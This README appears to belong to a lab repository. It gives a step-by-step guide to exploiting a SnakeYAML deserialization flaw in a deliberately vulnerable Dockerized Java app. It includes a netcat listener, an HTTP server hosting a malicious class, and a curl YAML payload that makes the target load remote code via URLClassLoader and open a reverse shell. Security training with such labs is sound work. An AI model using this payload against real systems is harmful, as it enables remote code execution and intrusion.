Exploiting SnakeYAML Deserialization Vulnerability and Obtaining a Reverse Shell
This repository contains a step-by-step guide on how to exploit the SnakeYAML deserialization vulnerability in a Java application running in a Docker container, and how to obtain a reverse shell. Please note that this guide is for educational purposes only and should not be used for any malicious activities.

Prerequisites
Before starting, make sure you have the following:

Docker installed on your system.
Basic knowledge of Docker and Java.
About the Vulnerable Application
The vulnerable Java application running in the Docker container is designed to accept unsanitized YAML input. The application uses SnakeYAML, a popular YAML library for Java, which is known to have a deserialization vulnerability.

It's important to note that in a secure production environment, applications should always validate and sanitize user input to prevent security vulnerabilities like this. The purpose of this repository is to demonstrate the exploitation of such vulnerabilities for educational purposes only.

Steps
1. Set up the Docker environment
Clone this repository to your local machine.
Navigate to the repository's directory.
2. Build the vulnerable application
Build the Docker image containing the vulnerable Java application by running the following command:

docker build -t vulnerable-app .
3. Start the Docker container
Start the Docker container using the following command:

docker run -d -p 8080:8080 --name vulnerable-container vulnerable-app

4. Edit and compile ExploitScriptEngineFactory.java
javac ExploitScriptEngineFactory.java

Then place the class file inside the folder (e.g exploit/ExploitScriptEngineFactory.class)

5. Start an HTTP server

Start an HTTP server to host the java class file inside the `src` directory. You can use Python's SimpleHTTPServer module:

python3 -m http.server 8000

6. Exploit the SnakeYAML deserialization vulnerability
Start a listener on your local machine to receive the reverse shell connection. Use Netcat or any other suitable tool:

nc -lvp 3333
Serve the java class file using the same HTTP server from step 4.


Use a tool like Burp Suite or curl to send a malicious payload to the vulnerable application. Modify the payload as per your requirements.

curl -X POST -H "Content-Type: application/x-yaml" \
     -d '!!javax.script.ScriptEngineManager [
          !!java.net.URLClassLoader [[!!java.net.URL ["http://<your-server-ip>:8000/"]]]
        ]' \
     http://localhost:8080/endpoint


Once the payload is successfully executed on the vulnerable machine, you will receive a reverse shell connection on your listener.

Disclaimer
This guide is provided for educational purposes only. Do not use this information for any illegal or malicious activities. The authors and contributors are not responsible for any misuse or damage caused. Use at your own risk.

Contributing
If you have any improvements or suggestions for this guide, please feel free to submit a pull request.

License
This project is licensed under the MIT License.